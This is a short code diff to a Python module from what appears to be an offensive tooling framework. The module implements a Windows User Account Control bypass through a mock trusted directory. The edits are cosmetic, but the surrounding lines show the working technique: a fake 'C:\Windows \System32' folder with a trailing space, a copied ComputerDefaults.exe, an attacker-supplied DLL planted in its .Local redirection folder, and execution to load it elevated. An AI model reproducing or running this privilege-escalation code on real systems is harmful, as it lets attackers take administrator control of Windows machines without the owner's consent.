@@ -3,9 +3,11 @@
 #
 # DESCRIPTION
 # Mockingtrusteddirectory UAC bypass 
-from module import Module
+try:
+    from ...module import Module
+except ImportError:
+    from module import Module
 import subprocess
-import copy
 import os
 import shutil
 from platform import platform
@@ -43,12 +45,12 @@ class CustomModule(Module):
         if not os.path.isdir(new_system32_path):
             os.mkdir(new_system32_path)
         
-        shutil.copy(src = "C:\\Windows\\System32\\ComputerDefaults.exe", dst="C:\\Windows \\System32\\ComputerDefaults.exe")
+        shutil.copy(src="C:\\Windows\\System32\\ComputerDefaults.exe", dst="C:\\Windows \\System32\\ComputerDefaults.exe")
         if not os.path.isdir(computerdefaults_path):
             os.mkdir(computerdefaults_path)
         if not os.path.isdir(computerdefaults_path_2):
             os.mkdir(computerdefaults_path_2)
-        shutil.copy(src="{0}\\{1}".format(self.args["base"], self.args["dll"]), 
+        shutil.copy(src="{0}\\{1}".format(self.args["base"], self.args["dll"]),
                     dst="C:\\Windows \\System32\\ComputerDefaults.exe.Local\\{0}\\{1}".format(self.args["common-control"], self.args["dll"]))
         try:
             subprocess.call("C:\\Windows \\System32\\ComputerDefaults.exe", shell=True)
